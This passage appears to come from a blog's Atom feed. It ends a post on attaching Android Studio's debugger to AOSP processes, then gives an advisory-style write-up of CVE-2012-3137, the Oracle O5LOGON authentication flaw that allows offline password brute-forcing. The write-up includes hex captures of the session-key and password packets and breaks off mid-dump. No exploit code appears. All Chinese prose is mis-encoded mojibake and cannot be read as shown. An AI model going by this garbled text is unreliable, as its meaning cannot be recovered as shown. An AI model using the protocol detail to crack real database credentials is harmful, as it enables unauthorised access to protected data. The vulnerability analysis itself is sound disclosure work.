å¯¼å…¥åå¯ä»¥Android Studio ä¸­æµè§ˆAOSP æºç </p><ol start="2"><li>è®¾ç½®è¿œç¨‹è°ƒè¯•é…ç½®æ–‡ä»¶</li></ol><p>Run -&gt; Edit Configuration ç‚¹å‡»å·¦ä¸Šè§’çš„ + ç±»å‹é€‰æ‹© Remote</p><ol start="3"><li>Attack åˆ°éœ€è¦è°ƒè¯•çš„è¿›ç¨‹</li></ol><p>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯ä½¿ç”¨SDK æä¾›çš„ Monitor äºŒæ˜¯ä½¿ç”¨ Android Studio è‡ªå¸¦çš„<br>Attach debugger to Android Process æŒ‰é’®ã€‚ </p><p>è¿æ¥æˆåŠŸåå°†çœ‹åˆ° Connected to the target VM</p><ol start="4"><li>è®¾ç½®æ–­ç‚¹</li></ol><p>è®¾ç½®æ–­ç‚¹å¾ˆç®€å•ï¼Œç”¨é¼ æ ‡ç‚¹å‡»æºç æ–‡ä»¶çš„å·¦è¾¹æ ï¼Œçœ‹è§çº¢è‰²åœ†ç‚¹è¯´æ˜å°±å·²ç»è®¾ç½®æˆåŠŸäº†ã€‚ä¹Ÿ<br>å¯ä»¥ä½¿ç”¨Ctrl + F8 çš„å¿«æ·é”®ã€‚</p><ol start="5"><li>è¿è¡Œç¨‹åºï¼Œè§¦å‘æ–­ç‚¹</li></ol><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­ä¼šå‡ºç°æºç å¯¹ä¸ä¸Šçš„æƒ…å†µï¼Œéœ€è¦è‡ªå·±é€‰æ‹©æ­£ç¡®çš„æºç ã€‚å…³äºå“ªäº›<br>è¿›ç¨‹å¯ä»¥è°ƒè¯•çš„é—®é¢˜ï¼Œä¸Šç¯‡å·²ç»æœ‰è®°å½•ï¼Œè¿™é‡Œå°±ä¸åœ¨è¯´äº†ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ol><li>AOSP Sources in the IDE<br><a href="https://newcircle.com/s/post/1720/aosp_sources_in_the_ide">https://newcircle.com/s/post/1720/aosp_sources_in_the_ide</a></li><li>Debugging AOSP Platform code with Android Studio - Part I - Java Debugger<br><a href="http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html">http://ronubo.blogspot.sg/2016/01/debugging-aosp-platform-code-with.html</a></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle Databaseèº«ä»½éªŒè¯åè®®å®‰å…¨é™åˆ¶ç»•è¿‡æ¼æ´(CVE-2012-3137)</title>
    <link href="/cn/cve-2012-3137/"/>
    <url>/cn/cve-2012-3137/</url>
    
    <content type="html"><![CDATA[<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs subunit">NSFOCUS ID:    20847<br>BUGTRAQ ID:    55651<br>CVE ID:        CVE<span class="hljs-string">-2012</span><span class="hljs-string">-3137</span><br>è¿œç¨‹æ¼æ´ï¼š      æ˜¯<br>æœ¬åœ°æ¼æ´ï¼š      æ˜¯<br>æ¼æ´ç±»å‹ï¼š<br>æ¼æ´å½±å“ï¼š      è¿œç¨‹æ”»å‡»è€…å¯ä»¥å¯†ç è¿›è¡Œç¦»çº¿å¯†ç æš´åŠ›ç ´è§£<br>å±é™©æŒ‡æ•°ï¼š      é«˜<br>åˆ›å»ºæ—¶é—´ï¼š      2012<span class="hljs-string">-9</span><span class="hljs-string">-27</span><br>æ›´æ–°æ—¶é—´ï¼š<br>æ”»å‡»ä»£ç ï¼š      æ— <br><br>è·Ÿè¸ªå·¥ç¨‹å¸ˆï¼š    zz<br></code></pre></td></tr></table></figure><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°:"></a>æ¼æ´æ¦‚è¿°:</h2><p>Oracleæ˜¯ä¸€æ¬¾å¹¿æ³›è¢«ä½¿ç”¨çš„å•†ä¸šæ•°æ®åº“ã€‚</p><p>Oracle O5LOGONè®¤è¯åè®®å­˜åœ¨æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å¯ä»¥ä½¿æ”»å‡»è€…ç¦»çº¿æš´åŠ›ç ´è§£Oracleæ•°æ®åº“å¯†ç ï¼Œ<br>ä»è€Œè®¿é—®å—ä¿æŠ¤çš„Oracleæ•°æ®åº“ä¸­çš„æ•°æ®ã€‚è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´æ”»å‡»è€…åªéœ€è¦çŸ¥é“ä¸€ä¸ªåˆæ³•çš„<br>æ•°æ®åº“ç”¨æˆ·åå’Œä¸€ä¸ªæ­£ç¡®çš„æ•°æ®åº“å(SID)ï¼Œä¸éœ€è¦ä½¿ç”¨ä¸­é—´äººæ”»å‡»ã€‚</p><p>Martinez Fayo åœ¨2010å¹´5æœˆå‘OracleæŠ¥å‘Šäº†è¿™ä¸ªé—®é¢˜ï¼ŒOracleåœ¨2011å¹´çš„ä¸­æœŸé€šè¿‡patch<br> set 11.2.0.3ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œä½¿ç”¨äº†æ–°ç‰ˆæœ¬çš„åè®®ã€‚ä½†æ˜¯Oracleæ²¡æœ‰åœ¨ 11.1å’Œ11.2 ä¸­<br>ä¿®å¤è¿™ä¸ªé—®é¢˜ï¼Œå› æ­¤è¿™äº›ç‰ˆæœ¬ä»ç„¶å­˜åœ¨æ¼æ´ã€‚</p><p>ç”±äºæ¼æ´å‘ç”Ÿåœ¨è®¤è¯é˜¶æ®µçš„æ—©æœŸï¼Œè·å–éœ€è¦çš„æ•°æ®åé©¬ä¸Šæ–­å¼€è¿æ¥ï¼Œä¸ä¼šåœ¨Oracleæ•°æ®åº“<br>é‡Œç•™ä¸‹ç™»å½•æ—¥å¿—ï¼Œå› æ­¤è¿™ä¸ªæ¼æ´è¢«ç§°ä¸º â€œstealth password cracking vulnerabilityâ€</p><p>ç»†èŠ‚ï¼š</p><p>O5LOGON è¿‡ç¨‹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino">         send username<br><span class="hljs-built_in">Client</span> -----------------------------&gt; <span class="hljs-built_in">Server</span><br><br>         AUTH_SESSKEY  AUTH_VFR_DATA<br><span class="hljs-built_in">Client</span> &lt;----------------------------  <span class="hljs-built_in">Server</span><br><br>         AUTH_SESSKEY  AUTH_PASSWORD<br>Clinet -----------------------------&gt; <span class="hljs-built_in">Server</span><br></code></pre></td></tr></table></figure><p>å’Œè¿™ä¸ªæ¼æ´ç›¸å…³çš„ä¸¤ä¸ªæŠ¥æ–‡ï¼ŒåŒ…å«äº†éœ€è¦çš„ä¿¡æ¯, å¦‚ä¸‹ï¼š</p><p>(1) Server -&gt; client</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>   <span class="hljs-number">00</span> f8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">0010</span>   <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">4</span>b <span class="hljs-number">45</span> <span class="hljs-number">59</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>  ..AUTH_SESSKEY`.<br><span class="hljs-attribute">0020</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">60</span> <span class="hljs-number">35</span> <span class="hljs-number">32</span> <span class="hljs-number">46</span> <span class="hljs-number">43</span> <span class="hljs-number">30</span> <span class="hljs-number">34</span> <span class="hljs-number">42</span> <span class="hljs-number">31</span> <span class="hljs-number">46</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span>  ..`<span class="hljs-number">52</span>FC04B1FF811<br><span class="hljs-attribute">0030</span>   <span class="hljs-number">30</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">36</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">35</span> <span class="hljs-number">42</span> <span class="hljs-number">43</span> <span class="hljs-number">36</span> <span class="hljs-number">31</span> <span class="hljs-number">41</span> <span class="hljs-number">37</span>  <span class="hljs-number">0</span>CA1263DF5BC61A7<br><span class="hljs-attribute">0040</span>   <span class="hljs-number">45</span> <span class="hljs-number">35</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">43</span> <span class="hljs-number">38</span> <span class="hljs-number">41</span> <span class="hljs-number">35</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span> <span class="hljs-number">44</span> <span class="hljs-number">32</span> <span class="hljs-number">32</span>  E57740C8A5111D22<br><span class="hljs-attribute">0050</span>   <span class="hljs-number">42</span> <span class="hljs-number">34</span> <span class="hljs-number">31</span> <span class="hljs-number">45</span> <span class="hljs-number">35</span> <span class="hljs-number">33</span> <span class="hljs-number">43</span> <span class="hljs-number">43</span> <span class="hljs-number">31</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">32</span> <span class="hljs-number">41</span>  B41E53CC167FDF2A<br><span class="hljs-attribute">0060</span>   <span class="hljs-number">36</span> <span class="hljs-number">38</span> <span class="hljs-number">37</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">38</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">44</span> <span class="hljs-number">39</span> <span class="hljs-number">42</span> <span class="hljs-number">32</span> <span class="hljs-number">42</span> <span class="hljs-number">36</span>  <span class="hljs-number">6878958200</span>D9B2B6<br><span class="hljs-attribute">0070</span>   <span class="hljs-number">41</span> <span class="hljs-number">35</span> <span class="hljs-number">31</span> <span class="hljs-number">43</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">44</span> <span class="hljs-number">37</span> <span class="hljs-number">37</span> <span class="hljs-number">39</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">45</span> <span class="hljs-number">42</span> <span class="hljs-number">41</span> <span class="hljs-number">42</span>  A51C95D779FDEBAB<br><span class="hljs-attribute">0080</span>   <span class="hljs-number">42</span> <span class="hljs-number">36</span> <span class="hljs-number">39</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span>  B69.........AUTH<br><span class="hljs-attribute">0090</span>   <span class="hljs-number">5</span>f <span class="hljs-number">56</span> <span class="hljs-number">46</span> <span class="hljs-number">52</span> <span class="hljs-number">5</span>f <span class="hljs-number">44</span> <span class="hljs-number">41</span> <span class="hljs-number">54</span> <span class="hljs-number">41</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span> <span class="hljs-number">34</span> <span class="hljs-number">33</span>  _VFR_DATA.....<span class="hljs-number">43</span><br><span class="hljs-attribute">00a0</span>   <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">42</span> <span class="hljs-number">45</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">42</span> <span class="hljs-number">33</span> <span class="hljs-number">32</span> <span class="hljs-number">42</span> <span class="hljs-number">30</span> <span class="hljs-number">42</span> <span class="hljs-number">42</span> <span class="hljs-number">37</span> <span class="hljs-number">36</span> <span class="hljs-number">45</span>  E0BE20B32B0BB76E<br><span class="hljs-attribute">00b0</span>   <span class="hljs-number">35</span> <span class="hljs-number">37</span> <span class="hljs-number">25</span> <span class="hljs-number">1</span>b <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">57</span>%.............<br><span class="hljs-attribute">00c0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">00d0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">00e0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  ................<br><span class="hljs-attribute">00f0</span>   <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                          ........<br></code></pre></td></tr></table></figure><p>(2) server &lt;- client</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>   <span class="hljs-number">03</span> <span class="hljs-number">73</span> <span class="hljs-number">03</span> d0 <span class="hljs-number">1</span>a <span class="hljs-number">05</span> <span class="hljs-number">0</span>a <span class="hljs-number">09</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">21</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">44</span>  .s.........!...D<br><span class="hljs-attribute">0010</span>   <span class="hljs-number">46</span> bf bf <span class="hljs-number">0</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ec <span class="hljs-number">42</span> bf bf d8 <span class="hljs-number">53</span> bf bf <span class="hljs-number">03</span>  F.......B...S...<br><span class="hljs-attribute">0020</span>   <span class="hljs-number">73</span> <span class="hljs-number">79</span> <span class="hljs-number">73</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>c <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">53</span> <span class="hljs-number">45</span> <span class="hljs-number">53</span>  sys$....AUTH_SES<br><span class="hljs-attribute">0030</span>   <span class="hljs-number">53</span> <span class="hljs-number">4</span>b <span class="hljs-number">45</span> <span class="hljs-number">59</span> <span class="hljs-number">20</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> fe <span class="hljs-number">40</span> <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">36</span> <span class="hljs-number">44</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span>  SKEY ....@FA6DCD<br><span class="hljs-attribute">0040</span>   <span class="hljs-number">30</span> <span class="hljs-number">46</span> <span class="hljs-number">33</span> <span class="hljs-number">38</span> <span class="hljs-number">39</span> <span class="hljs-number">45</span> <span class="hljs-number">39</span> <span class="hljs-number">32</span> <span class="hljs-number">44</span> <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span> <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span>  <span class="hljs-number">0</span>F389E92D18F8188<br><span class="hljs-attribute">0050</span>   <span class="hljs-number">45</span> <span class="hljs-number">43</span> <span class="hljs-number">36</span> <span class="hljs-number">39</span> <span class="hljs-number">33</span> <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">42</span> <span class="hljs-number">35</span> <span class="hljs-number">32</span> <span class="hljs-number">34</span> <span class="hljs-number">46</span> <span class="hljs-number">34</span> <span class="hljs-number">32</span> <span class="hljs-number">31</span> <span class="hljs-number">31</span>  EC69313B524F4211<br><span class="hljs-attribute">0060</span>   <span class="hljs-number">38</span> <span class="hljs-number">34</span> <span class="hljs-number">46</span> <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span> <span class="hljs-number">39</span> <span class="hljs-number">36</span> <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">37</span> <span class="hljs-number">32</span> <span class="hljs-number">46</span> <span class="hljs-number">43</span>  <span class="hljs-number">84</span>FAE679613A72FC<br><span class="hljs-attribute">0070</span>   <span class="hljs-number">38</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">30</span> <span class="hljs-number">41</span> <span class="hljs-number">34</span> <span class="hljs-number">43</span> <span class="hljs-number">37</span> <span class="hljs-number">42</span> <span class="hljs-number">20</span> <span class="hljs-number">42</span> <span class="hljs-number">39</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">36</span>  <span class="hljs-number">8</span>DFD0A4C7B B93A6<br><span class="hljs-attribute">0080</span>   <span class="hljs-number">41</span> <span class="hljs-number">43</span> <span class="hljs-number">42</span> <span class="hljs-number">38</span> <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">35</span> <span class="hljs-number">42</span> <span class="hljs-number">38</span> <span class="hljs-number">32</span> <span class="hljs-number">35</span> <span class="hljs-number">38</span> <span class="hljs-number">41</span> <span class="hljs-number">30</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span>  ACB8E05B8258A020<br><span class="hljs-attribute">0090</span>   <span class="hljs-number">44</span> <span class="hljs-number">32</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">34</span> <span class="hljs-number">45</span> <span class="hljs-number">43</span> <span class="hljs-number">31</span> <span class="hljs-number">42</span> <span class="hljs-number">36</span> <span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  D2954EC1B63.....<br><span class="hljs-attribute">00a0</span>   <span class="hljs-number">27</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">50</span> <span class="hljs-number">41</span> <span class="hljs-number">53</span> <span class="hljs-number">53</span> <span class="hljs-number">57</span> <span class="hljs-number">4</span>f  &#x27;....AUTH_PASSWO<br><span class="hljs-attribute">00b0</span>   <span class="hljs-number">52</span> <span class="hljs-number">44</span> c0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">40</span> <span class="hljs-number">32</span> <span class="hljs-number">43</span> <span class="hljs-number">35</span> <span class="hljs-number">46</span> <span class="hljs-number">39</span> <span class="hljs-number">35</span> <span class="hljs-number">37</span> <span class="hljs-number">41</span> <span class="hljs-number">36</span>  RD....@<span class="hljs-number">2</span>C5F957A6<br><span class="hljs-attribute">00c0</span>   <span class="hljs-number">35</span> <span class="hljs-number">33</span> <span class="hljs-number">32</span> <span class="hljs-number">41</span> <span class="hljs-number">44</span> <span class="hljs-number">39</span> <span class="hljs-number">31</span> <span class="hljs-number">44</span> <span class="hljs-number">39</span> <span class="hljs-number">31</span> <span class="hljs-number">36</span> <span class="hljs-number">46</span> <span class="hljs-number">34</span> <span class="hljs-number">45</span> <span class="hljs-number">35</span> <span class="hljs-number">46</span>  <span class="hljs-number">532</span>AD91D916F4E5F<br><span class="hljs-attribute">00d0</span>   <span class="hljs-number">41</span> <span class="hljs-number">37</span> <span class="hljs-number">44</span> <span class="hljs-number">32</span> <span class="hljs-number">46</span> <span class="hljs-number">44</span> <span class="hljs-number">41</span> <span class="hljs-number">30</span> <span class="hljs-number">45</span> <span class="hljs-number">36</span> <span class="hljs-number">43</span> <span class="hljs-number">44</span> <span class="hljs-number">46</span> <span class="hljs-number">46</span> <span class="hljs-number">42</span> <span class="hljs-number">41</span>  A7D2FDA0E6CDFFBA<br><span class="hljs-attribute">00e0</span>   <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">44</span> <span class="hljs-number">38</span> <span class="hljs-number">38</span> <span class="hljs-number">33</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">46</span> <span class="hljs-number">34</span> <span class="hljs-number">46</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">43</span> <span class="hljs-number">38</span>  AED883CAF4F200C8<br><span class="hljs-attribute">00f0</span>   <span class="hljs-number">39</span> <span class="hljs-number">38</span> <span class="hljs-number">33</span> <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">08</span>  <span class="hljs-number">983</span>AE3D.........<br><span class="hljs-attribute">0100</span>   <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">52</span> <span class="hljs-number">54</span> <span class="hljs-number">54</span> <span class="hljs-number">0</span>f <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">36</span> <span class="hljs-number">36</span> <span class="hljs-number">37</span>  AUTH_RTT.....<span class="hljs-number">667</span><br><span class="hljs-attribute">0110</span>   <span class="hljs-number">30</span> <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">27</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f  <span class="hljs-number">08</span>....&#x27;....AUTH_<br><span class="hljs-attribute">0120</span>   <span class="hljs-number">43</span> <span class="hljs-number">4</span>c <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">5</span>f <span class="hljs-number">4</span>d <span class="hljs-number">45</span> <span class="hljs-number">4</span>d <span class="hljs-number">0</span>c <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span> <span class="hljs-number">39</span>  CLNT_MEM.....<span class="hljs-number">409</span><br><span class="hljs-attribute">0130</span>   <span class="hljs-number">36</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">27</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f <span class="hljs-number">54</span>  <span class="hljs-number">6</span>....&#x27;....AUTH_T<br><span class="hljs-attribute">0140</span>   <span class="hljs-number">45</span> <span class="hljs-number">52</span> <span class="hljs-number">4</span>d <span class="hljs-number">49</span> <span class="hljs-number">4</span>e <span class="hljs-number">41</span> <span class="hljs-number">4</span>c <span class="hljs-number">12</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">06</span> <span class="hljs-number">70</span> <span class="hljs-number">74</span> <span class="hljs-number">73</span> <span class="hljs-number">2</span>f  ERMINAL.....pts/<br><span class="hljs-attribute">0150</span>   <span class="hljs-number">31</span> <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>d <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>f <span class="hljs-number">41</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>f  <span class="hljs-number">18</span>....-....AUTH_<br><span class="hljs-attribute">0160</span>   <span class="hljs-number">50</span> <span class="hljs-number">52</span> <span class="hljs-number">4</span>f <span class="hljs-number">47</span> <span class="hljs-number">52</span> <span class="hljs-number">41</span> <span class="hljs-number">4</span>d <span class="hljs-number">5</span>f <span class="hljs-number">4</span>e <span class="hljs-number">4</span>d <span class="hljs-number">51</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">1</span>b <span class="hljs-number">73</span>  PROGRAM_NMQ....s<br><span class="hljs-attribute">0170</span>   <span class="hljs-number">71</span> <span class="hljs-number">6</span>c <span class="hljs-number">70</span> <span class="hljs-number">6</span>c <span class="hljs-number">75</span> <span class="hljs-number">73</span> <span class="hljs-number">40</span> <span class="hljs-number">68</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">28</span>  qlplus@henices (<br><span class="hljs-attribute">0180</span>   <span class="hljs-number">54</span> <span class="hljs-number">4</span>e <span class="hljs-number">53</span> <span class="hljs-number">20</span> <span class="hljs-number">56</span> <span class="hljs-number">31</span> <span class="hljs-number">2</span>d <span class="hljs-number">56</span> <span class="hljs-number">33</span> <span class="hljs-number">29</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">24</span> <span 